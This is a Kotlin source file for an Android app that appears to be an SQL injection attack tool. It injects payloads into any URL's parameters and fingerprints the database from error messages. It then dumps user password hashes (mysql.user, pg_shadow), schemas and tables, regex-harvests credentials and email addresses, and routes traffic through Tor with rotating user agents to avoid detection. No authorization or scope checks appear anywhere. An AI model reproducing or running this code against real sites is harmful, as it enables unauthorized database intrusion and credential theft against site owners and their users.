package com.sqliblackboxpro

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import java.io.IOException
import java.net.InetSocketAddress
import java.net.Proxy
import java.net.SocketTimeoutException
import java.net.UnknownHostException
import java.util.concurrent.TimeUnit

class SQLScanner {
    
    companion object {
        private const val TAG = "SQLScanner"
        private const val CONNECT_TIMEOUT_SECONDS = 15L
        private const val READ_TIMEOUT_SECONDS = 15L
        private const val EARLY_FAILURE_THRESHOLD = 3 // Fail fast if first 3 payloads all error
        private const val MAX_EXTRACTION_PAYLOADS = 5 // Try up to 5 data extraction payloads
        private const val MAX_EXTRACTED_ITEMS = 15 // Limit extracted data items
        private const val MAX_TABLE_EXTRACTIONS = 5 // Limit table name extractions
        private const val MAX_EMAIL_EXTRACTIONS = 5 // Limit email extractions
        private const val MIN_HASH_LENGTH = 32 // Minimum length for MD5/SHA hashes
        private const val MAX_VULNERABLE_RESPONSE_LENGTH = 1000 // Max response to store for vulnerable payloads
        private const val RESPONSE_SEPARATOR_LENGTH = 50 // Length of separator line in responses
        private const val MAX_DUMP_LINE_LENGTH = 200 // Max line length for dump data
        private const val MAX_DUMP_LINES = 20 // Max lines to include from dump responses
    }
    
    private val standardClient = OkHttpClient.Builder()
        .connectTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(READ_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()
    
    private val torClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .proxy(Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)))
        .followRedirects(true)
        .followSslRedirects(true)
        .build()
    
    private val stealthUserAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    )
    
    suspend fun scanURL(url: String, mode: ScanMode): ScanResult = withContext(Dispatchers.IO) {
        Log.d(TAG, "Starting scan for URL: $url with mode: $mode")
        
        // Validate URL format
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            throw IllegalArgumentException("URL must start with http:// or https://")
        }
        
        val client = when (mode) {
            ScanMode.STANDARD -> standardClient
            ScanMode.TOR -> {
                Log.d(TAG, "Using Tor SOCKS proxy at 127.0.0.1:9050")
                torClient
            }
            ScanMode.STEALTH -> createStealthClient()
        }
        
        var vulnerabilityFound = false
        var detectedDatabase = DatabaseType.UNKNOWN
        var successfulPayload = ""
        var responseDetails = ""
        val extractedData = mutableListOf<String>()
        val vulnerablePayloads = mutableListOf<VulnerablePayload>()
        var testedPayloads = 0
        var errorCount = 0
        val errorMessages = mutableListOf<String>()
        
        // Test detection payloads first
        Log.d(TAG, "Testing ${SQLPayloads.DETECTION_PAYLOADS.size} detection payloads...")
        for (payload in SQLPayloads.DETECTION_PAYLOADS) {
            try {
                testedPayloads++
                val testUrl = buildTestUrl(url, payload)
                Log.d(TAG, "Testing payload $testedPayloads: ${payload.take(50)}...")
                
                val request = Request.Builder()
                    .url(testUrl)
                    .apply {
                        if (mode == ScanMode.STEALTH) {
                            header("User-Agent", stealthUserAgents.random())
                        }
                    }
                    .build()
                
                val response = client.newCall(request).execute()
                val statusCode = response.code
                val body = response.body?.string() ?: ""
                response.close()
                
                Log.d(TAG, "Response: Status=$statusCode, Body length=${body.length}")
                
                // Check for SQL errors in response
                if (containsSQLError(body)) {
                    val description = SQLPayloads.getPayloadDescription(payload)
                    vulnerablePayloads.add(
                        VulnerablePayload(
                            payload = payload,
                            description = description,
                            response = "Status: $statusCode\n\n${body.take(MAX_VULNERABLE_RESPONSE_LENGTH)}"
                        )
                    )
                    
                    if (!vulnerabilityFound) {
                        vulnerabilityFound = true
                        detectedDatabase = detectDatabaseType(body)
                        successfulPayload = payload
                        responseDetails = "Status: $statusCode\n\n${body.take(500)}"
                        Log.i(TAG, "VULNERABILITY FOUND! Payload: $payload, DB Type: $detectedDatabase")
                    }
                }
            } catch (e: UnknownHostException) {
                errorCount++
                val msg = "DNS Error: Cannot resolve host - ${e.message}"
                errorMessages.add(msg)
                Log.e(TAG, msg, e)
                // This is a critical error, throw it
                throw IOException("Cannot connect to server. Please check the URL and your internet connection.")
            } catch (e: SocketTimeoutException) {
                errorCount++
                val msg = "Timeout on payload ${testedPayloads}: ${e.message}"
                errorMessages.add(msg)
                Log.w(TAG, msg)
                // Continue with other payloads on timeout
            } catch (e: IOException) {
                errorCount++
                val msg = "Network error on payload ${testedPayloads}: ${e.message}"
                errorMessages.add(msg)
                Log.e(TAG, msg, e)
                // If all payloads fail with network errors, this is a problem
                if (errorCount >= EARLY_FAILURE_THRESHOLD && testedPayloads <= EARLY_FAILURE_THRESHOLD) {
                    throw IOException("Network connection failed. Please check your internet connection.")
                }
            } catch (e: Exception) {
                errorCount++
                val msg = "Error on payload ${testedPayloads}: ${e.javaClass.simpleName} - ${e.message}"
                errorMessages.add(msg)
                Log.e(TAG, msg, e)
            }
        }
        
        Log.d(TAG, "Detection phase complete. Tested: $testedPayloads, Errors: $errorCount, Found: $vulnerabilityFound")
        
        // If vulnerability found, try to extract data
        if (vulnerabilityFound) {
            val extractionPayloads = when (detectedDatabase) {
                DatabaseType.MYSQL -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
                DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_PAYLOADS
                DatabaseType.MSSQL -> SQLPayloads.MSSQL_PAYLOADS
                DatabaseType.ORACLE -> SQLPayloads.ORACLE_PAYLOADS
                else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
            }
            
            Log.d(TAG, "Attempting data extraction with ${extractionPayloads.size} payloads...")
            for (payload in extractionPayloads.take(MAX_EXTRACTION_PAYLOADS)) {
                try {
                    val testUrl = buildTestUrl(url, payload)
                    val request = Request.Builder()
                        .url(testUrl)
                        .apply {
                            if (mode == ScanMode.STEALTH) {
                                header("User-Agent", stealthUserAgents.random())
                            }
                        }
                        .build()
                    
                    val response = client.newCall(request).execute()
                    val body = response.body?.string() ?: ""
                    response.close()
                    
                    // Try to extract data from response
                    val extracted = extractDataFromResponse(body)
                    if (extracted.isNotEmpty()) {
                        extractedData.addAll(extracted)
                        Log.i(TAG, "Extracted ${extracted.size} data items")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error during data extraction: ${e.message}")
                    // Continue with next payload
                }
            }
        }
        
        // Add diagnostic info if no vulnerability found
        if (!vulnerabilityFound && responseDetails.isEmpty()) {
            val errorSummary = if (errorMessages.isNotEmpty()) {
                "Errors encountered:\n" + errorMessages.take(5).joinToString("\n")
            } else {
                "All requests completed successfully but no SQL errors were found in responses."
            }
            
            responseDetails = "Scan Summary:\n" +
                "- Tested $testedPayloads payloads\n" +
                "- Encountered $errorCount errors\n" +
                "- No SQL injection vulnerability detected\n\n" +
                errorSummary
        }
        
        ScanResult(
            isVulnerable = vulnerabilityFound,
            databaseType = detectedDatabase,
            extractedData = extractedData,
            payloadUsed = successfulPayload,
            responseDetails = responseDetails,
            vulnerablePayloads = vulnerablePayloads
        )
    }
    
    private fun createStealthClient(): OkHttpClient {
        return OkHttpClient.Builder()
            .connectTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .readTimeout(READ_TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .writeTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .followRedirects(true)
            .followSslRedirects(true)
            .build()
    }
    
    private fun buildTestUrl(baseUrl: String, payload: String): String {
        val separator = if (baseUrl.contains("?")) "&" else "?"
        // URL encode the payload to ensure it's properly transmitted
        val encodedPayload = java.net.URLEncoder.encode(payload, "UTF-8")
        
        // Try multiple injection points for better coverage
        return when {
            // If URL already has parameters, inject into first parameter value
            baseUrl.contains("?") -> {
                val parts = baseUrl.split("?", limit = 2)
                val base = parts[0]
                val params = parts[1]
                // Replace first parameter's value with payload
                val firstParam = params.split("&")[0]
                if (firstParam.contains("=")) {
                    val paramName = firstParam.split("=")[0]
                    val remainingParams = params.split("&").drop(1)
                    if (remainingParams.isNotEmpty()) {
                        "${base}?${paramName}=${encodedPayload}&${remainingParams.joinToString("&")}"
                    } else {
                        "${base}?${paramName}=${encodedPayload}"
                    }
                } else {
                    "${baseUrl}&test=${encodedPayload}"
                }
            }
            // Otherwise, add new parameter
            else -> "${baseUrl}${separator}id=${encodedPayload}"
        }
    }
    
    private fun containsSQLError(response: String): Boolean {
        val errorPatterns = listOf(
            // MySQL errors
            "SQL syntax",
            "mysql_fetch",
            "mysqli",
            "Warning: mysql",
            "valid MySQL result",
            "MySqlClient",
            "com.mysql.jdbc.exceptions",
            "mysql_query",
            "mysql_num_rows",
            
            // PostgreSQL errors
            "PostgreSQL",
            "pg_query",
            "pg_exec",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql\\.",
            "PG::SyntaxError",
            "org.postgresql.util.PSQLException",
            
            // MSSQL errors
            "Microsoft SQL",
            "ODBC SQL",
            "SQL Server",
            "Driver.*SQL",
            "\\[SQL Server\\]",
            "\\[Microsoft\\]\\[ODBC",
            
            // Oracle errors
            "ORA-[0-9]{4,5}",
            "Oracle.*Driver",
            "Oracle.*Error",
            
            // SQLite errors
            "SQLite",
            "sqlite3",
            "SQLite3::SQLException",
            
            // Generic SQL errors
            "Unclosed quotation",
            "syntax error",
            "quoted string not properly terminated",
            "unterminated string literal",
            "unexpected end of SQL command",
            "java.sql.SQLException",
            "System.Data.SqlClient",
            "database error",
            "sql error",
            "query failed"
        )
        
        return errorPatterns.any { pattern ->
            try {
                if (pattern.contains("\\")) {
                    // Use regex for patterns with special characters
                    Regex(pattern, RegexOption.IGNORE_CASE).containsMatchIn(response)
                } else {
                    response.contains(pattern, ignoreCase = true)
                }
            } catch (e: Exception) {
                response.contains(pattern, ignoreCase = true)
            }
        }
    }
    
    private fun detectDatabaseType(response: String): DatabaseType {
        Log.d(TAG, "Detecting database type from response...")
        return when {
            response.contains("mysql", ignoreCase = true) ||
            response.contains("mysqli", ignoreCase = true) ||
            response.contains("MariaDB", ignoreCase = true) -> {
                Log.d(TAG, "Detected: MySQL")
                DatabaseType.MYSQL
            }
            
            response.contains("postgresql", ignoreCase = true) ||
            response.contains("pg_query", ignoreCase = true) ||
            response.contains("npgsql", ignoreCase = true) ||
            response.contains("postgres", ignoreCase = true) -> {
                Log.d(TAG, "Detected: PostgreSQL")
                DatabaseType.POSTGRESQL
            }
            
            response.contains("microsoft sql", ignoreCase = true) ||
            response.contains("sql server", ignoreCase = true) ||
            response.contains("mssql", ignoreCase = true) -> {
                Log.d(TAG, "Detected: MSSQL")
                DatabaseType.MSSQL
            }
            
            Regex("ORA-[0-9]{4,5}").containsMatchIn(response) ||
            response.contains("oracle", ignoreCase = true) -> {
                Log.d(TAG, "Detected: Oracle")
                DatabaseType.ORACLE
            }
            
            response.contains("sqlite", ignoreCase = true) -> {
                Log.d(TAG, "Detected: SQLite")
                DatabaseType.SQLITE
            }
            
            else -> {
                Log.d(TAG, "Detected: Unknown database type")
                DatabaseType.UNKNOWN
            }
        }
    }
    
    private fun extractDataFromResponse(response: String): List<String> {
        val extracted = mutableListOf<String>()
        
        try {
            // Look for common data patterns
            // Extract potential usernames and password hashes
            val usernamePattern = Regex("([a-zA-Z0-9_-]{3,}):(\\$[^\\s,]+|[a-f0-9]{$MIN_HASH_LENGTH,})")
            usernamePattern.findAll(response).forEach { match ->
                val user = match.groupValues[1]
                val hash = match.groupValues[2].take(50) // Limit hash display
                extracted.add("Credential: $user:${hash}")
                Log.d(TAG, "Extracted credential for user: $user")
            }
            
            // Extract database names
            val dbNamePattern = Regex("(?:database|schema)\\s*[=:]\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
            dbNamePattern.findAll(response).forEach { match ->
                extracted.add("Database: ${match.groupValues[1]}")
                Log.d(TAG, "Extracted database name: ${match.groupValues[1]}")
            }
            
            // Extract table names  
            val tablePattern = Regex("(?:table|from)\\s+([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
            tablePattern.findAll(response).take(MAX_TABLE_EXTRACTIONS).forEach { match ->
                extracted.add("Table: ${match.groupValues[1]}")
                Log.d(TAG, "Extracted table name: ${match.groupValues[1]}")
            }
            
            // Extract email addresses
            val emailPattern = Regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
            emailPattern.findAll(response).take(MAX_EMAIL_EXTRACTIONS).forEach { match ->
                extracted.add("Email: ${match.value}")
                Log.d(TAG, "Extracted email: ${match.value}")
            }
            
            // Extract version information
            val versionPattern = Regex("version[:\\s]+([0-9.]+[^\\s,<>]*)", RegexOption.IGNORE_CASE)
            versionPattern.find(response)?.let { match ->
                extracted.add("Version: ${match.groupValues[1]}")
                Log.d(TAG, "Extracted version: ${match.groupValues[1]}")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error extracting data: ${e.message}", e)
        }
        
        return extracted.distinct().take(MAX_EXTRACTED_ITEMS)
    }
    
    /**
     * Execute a specific SQL injection payload and return the response
     */
    suspend fun executePayload(url: String, payload: String, mode: ScanMode): String = withContext(Dispatchers.IO) {
        Log.d(TAG, "Executing payload: ${payload.take(50)}... on URL: $url")
        
        val client = when (mode) {
            ScanMode.STANDARD -> standardClient
            ScanMode.TOR -> torClient
            ScanMode.STEALTH -> createStealthClient()
        }
        
        val testUrl = buildTestUrl(url, payload)
        val request = Request.Builder()
            .url(testUrl)
            .apply {
                if (mode == ScanMode.STEALTH) {
                    header("User-Agent", stealthUserAgents.random())
                }
            }
            .build()
        
        val response = client.newCall(request).execute()
        val statusCode = response.code
        val body = response.body?.string() ?: ""
        response.close()
        
        Log.i(TAG, "Payload execution complete. Status: $statusCode, Response length: ${body.length}")
        
        return@withContext "HTTP Status: $statusCode\n\n" +
            "Full Response:\n" +
            "=".repeat(RESPONSE_SEPARATOR_LENGTH) + "\n" +
            body
    }
    
    /**
     * Attempt to dump database contents using various SQL injection techniques
     */
    suspend fun dumpDatabase(url: String, dbType: DatabaseType, mode: ScanMode): Map<String, List<String>> = withContext(Dispatchers.IO) {
        Log.d(TAG, "Starting database dump for URL: $url, DB Type: $dbType")
        
        val client = when (mode) {
            ScanMode.STANDARD -> standardClient
            ScanMode.TOR -> torClient
            ScanMode.STEALTH -> createStealthClient()
        }
        
        val dumpedData = mutableMapOf<String, List<String>>()
        
        // Database-specific dump payloads
        val dumpPayloads = when (dbType) {
            DatabaseType.MYSQL -> listOf(
                "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user-- " to "MySQL Users & Passwords",
                "' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- " to "Database Names",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- " to "Table Names",
                "' UNION SELECT NULL,CONCAT(table_name,':',column_name),NULL FROM information_schema.columns-- " to "Columns",
                "' UNION SELECT NULL,@@version,NULL-- " to "Database Version",
                "' UNION SELECT NULL,database(),NULL-- " to "Current Database"
            )
            DatabaseType.POSTGRESQL -> listOf(
                "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow-- " to "PostgreSQL Users",
                "' UNION SELECT NULL,datname,NULL FROM pg_database-- " to "Database Names",
                "' UNION SELECT NULL,tablename,NULL FROM pg_tables-- " to "Table Names",
                "' UNION SELECT NULL,version(),NULL-- " to "Database Version"
            )
            DatabaseType.MSSQL -> listOf(
                "' UNION SELECT NULL,name,NULL FROM sys.databases-- " to "Database Names",
                "' UNION SELECT NULL,name,NULL FROM sys.tables-- " to "Table Names",
                "' UNION SELECT NULL,@@version,NULL-- " to "Database Version",
                "' UNION SELECT NULL,SYSTEM_USER,NULL-- " to "System User"
            )
            DatabaseType.ORACLE -> listOf(
                "' UNION SELECT NULL,username,NULL FROM all_users-- " to "Oracle Users",
                "' UNION SELECT NULL,table_name,NULL FROM all_tables-- " to "Table Names",
                "' UNION SELECT NULL,banner,NULL FROM v$version-- " to "Database Version"
            )
            else -> listOf(
                "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'-- " to "SQLite Schema"
            )
        }
        
        for ((payload, category) in dumpPayloads) {
            try {
                val testUrl = buildTestUrl(url, payload)
                val request = Request.Builder()
                    .url(testUrl)
                    .apply {
                        if (mode == ScanMode.STEALTH) {
                            header("User-Agent", stealthUserAgents.random())
                        }
                    }
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                // Extract data from response
                val extracted = extractDataFromResponse(body)
                if (extracted.isNotEmpty()) {
                    dumpedData[category] = extracted
                    Log.i(TAG, "Dumped $category: ${extracted.size} items")
                } else {
                    // Try to parse raw response for data
                    val lines = body.lines()
                        .filter { it.isNotBlank() && it.length < MAX_DUMP_LINE_LENGTH }
                        .take(MAX_DUMP_LINES)
                    if (lines.isNotEmpty()) {
                        dumpedData[category] = lines
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error dumping $category: ${e.message}")
            }
        }
        
        if (dumpedData.isEmpty()) {
            dumpedData["Error"] = listOf("No data could be extracted. The target may not be vulnerable or uses protections.")
        }
        
        Log.d(TAG, "Database dump complete. Categories dumped: ${dumpedData.keys.size}")
        return@withContext dumpedData
    }
}
